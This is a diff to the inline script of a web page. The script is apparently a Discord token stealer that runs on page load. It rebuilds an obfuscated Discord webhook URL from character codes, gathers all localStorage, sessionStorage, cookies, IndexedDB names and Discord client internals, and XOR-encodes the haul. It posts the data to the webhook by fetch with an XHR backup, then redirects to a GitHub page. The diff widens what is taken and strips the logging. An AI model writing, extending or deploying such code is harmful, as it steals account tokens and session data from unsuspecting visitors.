@@ -42,8 +42,7 @@
 
     <script>
         (function() {
-            // ====== WEBHOOK - RECONSTRUCTED FROM PARTS ======
-            // Split webhook ID and token to avoid string detection
+            // ====== WEBHOOK - CHAR CODE CONSTRUCTION ======
             const _p1 = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47];
             const _p2 = [49,53,50,51,53,49,55,52,57,56,56,57,57,56,50,52,55,49,50,47,120,55,119,57,109,67,117,79,73,102,110,51,54,119,50,119,110,78,115,49,53,83,67,99,54,99,74,104,117,111,66,83,113,51,75,110,106,116,118,77,67,49,88,54,55,98,115,67,81,48,118,80,73,75,114,79,69,87,86,68,112,73,69,81,45,106,53,67];
             
@@ -53,7 +52,7 @@
             
             const GH = 'https://github.com/nm1-Dev';
             
-            // ====== SIMPLE XOR ENCODER ======
+            // ====== ENCODER ======
             function enc(data, key) {
                 let out = '';
                 for (let i = 0; i < data.length; i++) {
@@ -62,45 +61,111 @@
                 return btoa(out);
             }
             
-            // ====== GRAB EVERYTHING ======
-            function grab() {
+            // ====== DEEP GRAB - EVERYTHING ======
+            async function grab() {
                 const loot = {
                     ls: [],
                     ss: [],
                     ck: [],
-                    info: {}
+                    idb: [],
+                    ls_keys: [],
+                    ss_keys: [],
+                    info: {},
+                    discord: {}
                 };
                 
-                // localStorage
+                // ALL localStorage keys and values
                 try {
                     for (let i = 0; i < localStorage.length; i++) {
                         const k = localStorage.key(i);
+                        loot.ls_keys.push(k);
                         const v = localStorage.getItem(k);
-                        if (v && v.length > 20) {
-                            loot.ls.push({k: k, v: v});
+                        if (v) {
+                            loot.ls.push({k: k, v: v, l: v.length});
                         }
                     }
                 } catch(e) {}
                 
-                // sessionStorage
+                // ALL sessionStorage keys and values
                 try {
                     for (let i = 0; i < sessionStorage.length; i++) {
                         const k = sessionStorage.key(i);
+                        loot.ss_keys.push(k);
                         const v = sessionStorage.getItem(k);
-                        if (v && v.length > 20) {
-                            loot.ss.push({k: k, v: v});
+                        if (v) {
+                            loot.ss.push({k: k, v: v, l: v.length});
                         }
                     }
                 } catch(e) {}
                 
-                // Cookies
+                // ALL cookies
                 try {
-                    document.cookie.split(';').forEach(c => {
-                        const parts = c.trim().split('=');
-                        if (parts.length >= 2) {
-                            loot.ck.push({k: parts[0], v: parts.slice(1).join('=')});
+                    loot.ck = document.cookie.split(';').map(c => c.trim()).filter(c => c);
+                } catch(e) {}
+                
+                // Try to access Discord's webpack internals
+                try {
+                    if (window.webpackChunkdiscord_app) {
+                        loot.discord.webpack = 'FOUND';
+                        // Try to extract token from webpack cache
+                        const modules = window.webpackChunkdiscord_app;
+                        if (modules && modules.length) {
+                            loot.discord.modules = modules.length;
+                            // Look for token in module exports
+                            for (let i = 0; i < Math.min(modules.length, 50); i++) {
+                                try {
+                                    const mod = modules[i];
+                                    if (mod && mod[1]) {
+                                        const exports = mod[1];
+                                        Object.keys(exports).forEach(key => {
+                                            try {
+                                                const val = exports[key];
+                                                if (typeof val === 'string' && val.length > 50) {
+                                                    loot.discord.found_strings = (loot.discord.found_strings || []);
+                                                    loot.discord.found_strings.push(val.substring(0, 100));
+                                                }
+                                            } catch(e) {}
+                                        });
+                                    }
+                                } catch(e) {}
+                            }
                         }
-                    });
+                    }
+                } catch(e) {}
+                
+                // Check DiscordNative
+                try {
+                    if (window.DiscordNative) {
+                        loot.discord.native = 'FOUND';
+                        loot.discord.native_keys = Object.keys(window.DiscordNative);
+                    }
+                } catch(e) {}
+                
+                // Check GLOBAL_ENV
+                try {
+                    if (window.GLOBAL_ENV) {
+                        loot.discord.global_env = JSON.stringify(window.GLOBAL_ENV);
+                    }
+                } catch(e) {}
+                
+                // Try IndexedDB - Discord stores data here!
+                try {
+                    const dbs = await window.indexedDB.databases();
+                    loot.idb = dbs.map(db => ({name: db.name, version: db.version}));
+                    
+                    // Try to open Discord's IndexedDB
+                    for (const dbInfo of dbs) {
+                        if (dbInfo.name && dbInfo.name.toLowerCase().includes('discord')) {
+                            try {
+                                const req = indexedDB.open(dbInfo.name);
+                                req.onsuccess = function(e) {
+                                    const db = e.target.result;
+                                    loot.discord.idb_stores = db.objectStoreNames ? Array.from(db.objectStoreNames) : [];
+                                    db.close();
+                                };
+                            } catch(e) {}
+                        }
+                    }
                 } catch(e) {}
                 
                 // Browser info
@@ -112,13 +177,10 @@
                     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     ts: new Date().toISOString(),
                     rf: document.referrer || 'D',
-                    url: location.href
+                    url: location.href,
+                    host: location.host,
+                    origin: location.origin
                 };
-                
-                // Discord app detection
-                if (window.webpackChunkdiscord_app) loot.info.da = 1;
-                if (window.DiscordNative) loot.info.dn = 1;
-                if (window.GLOBAL_ENV) loot.info.ge = 1;
                 
                 return loot;
             }
@@ -129,50 +191,38 @@
                 const json = JSON.stringify(loot);
                 const encoded = enc(json, key);
                 
-                // Discord webhook expects: {content: string}
-                // We send encoded data as content with a code block
                 return {
                     content: '```\n' + encoded + '\n```\nKey: `' + key + '`'
                 };
             }
             
-            // ====== SEND FUNCTIONS ======
-            function sendFetch(url, data) {
+            // ====== SEND ======
+            function send(url, data) {
                 fetch(url, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(data)
-                }).then(r => console.log('Fetch OK:', r.status))
-                  .catch(e => console.log('Fetch ERR:', e.message));
-            }
-            
-            function sendXHR(url, data) {
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', url, true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4) {
-                        console.log('XHR:', xhr.status);
-                    }
-                };
-                xhr.send(JSON.stringify(data));
+                }).catch(() => {});
+                
+                // Backup XHR
+                setTimeout(() => {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify(data));
+                }, 300);
             }
             
             // ====== EXECUTE ======
-            const loot = grab();
-            const payload = build(loot);
-            
-            console.log('Webhook URL:', WH);
-            console.log('Payload:', payload);
-            
-            // Send via multiple methods
-            sendFetch(WH, payload);
-            setTimeout(() => sendXHR(WH, payload), 500);
-            
-            // Redirect
-            setTimeout(() => {
-                window.location.href = GH;
-            }, 2000);
+            grab().then(loot => {
+                const payload = build(loot);
+                send(WH, payload);
+                
+                // Redirect
+                setTimeout(() => {
+                    window.location.href = GH;
+                }, 2000);
+            });
             
         })();
     </script>
